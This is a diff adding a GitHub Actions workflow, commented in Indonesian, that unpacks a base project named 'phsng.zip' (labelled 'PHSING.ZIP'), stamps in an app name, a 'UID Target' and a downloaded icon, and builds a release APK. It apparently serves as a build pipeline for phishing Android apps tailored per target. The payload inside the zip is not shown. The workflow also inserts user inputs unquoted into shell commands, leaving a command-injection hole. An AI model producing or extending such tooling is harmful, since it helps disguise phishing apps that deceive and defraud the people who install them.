@@ -1,0 +1,69 @@
+name: Build Dart to APK from ZIP
+
+on:
+  workflow_dispatch:
+    inputs:
+      app_name:
+        description: 'Nama Aplikasi'
+        required: true
+      uid:
+        description: 'UID Target'
+        required: true
+      icon_url:
+        description: 'URL Icon'
+        required: true
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Set up Flutter
+        uses: subosito/flutter-action@v2
+        with:
+          flutter-version: '3.19.0' # Sesuaikan dengan versi Flutter project kamu
+          channel: 'stable'
+
+      # 1. EKSTRAK FILE ZIP (PHSING.ZIP)
+      - name: Unzip Base Dart
+        run: |
+          # Di sini menggunakan nama file phsng.zip sesuai permintaanmu
+          unzip phsng.zip -d project_folder
+
+      # 2. MASUK KE FOLDER HASIL EKSTRAK & EDIT
+      - name: Modifikasi Nama, UID, dan Icon
+        run: |
+          cd project_folder
+          
+          # A. Ganti Nama Aplikasi di AndroidManifest
+          sed -i "s|android:label=\".*\"|android:label=\"${{ github.event.inputs.app_name }}\"|g" android/app/src/main/AndroidManifest.xml
+          
+          # B. Timpa UID di file uid.json
+          mkdir -p android/app/src/main/assets
+          echo "{\"uid\":\"${{ github.event.inputs.uid }}\"}" > android/app/src/main/assets/uid.json
+          
+          # C. Ganti Icon Aplikasi
+          rm -f android/app/src/main/res/mipmap-*/ic_launcher.png
+          rm -f android/app/src/main/res/mipmap-*/ic_launcher.webp
+          wget -O android/app/src/main/res/mipmap-hdpi/ic_launcher.png "${{ github.event.inputs.icon_url }}"
+          wget -O android/app/src/main/res/mipmap-mdpi/ic_launcher.png "${{ github.event.inputs.icon_url }}"
+          wget -O android/app/src/main/res/mipmap-xhdpi/ic_launcher.png "${{ github.event.inputs.icon_url }}"
+          wget -O android/app/src/main/res/mipmap-xxhdpi/ic_launcher.png "${{ github.event.inputs.icon_url }}"
+          wget -O android/app/src/main/res/mipmap-xxxhdpi/ic_launcher.png "${{ github.event.inputs.icon_url }}"
+
+      # 3. BUILD APK
+      - name: Build APK
+        run: |
+          cd project_folder
+          flutter pub get
+          flutter build apk --release
+
+      # 4. UPLOAD HASIL APK
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: Hasil-APK
+          path: project_folder/build/app/outputs/flutter-apk/app-release.apk
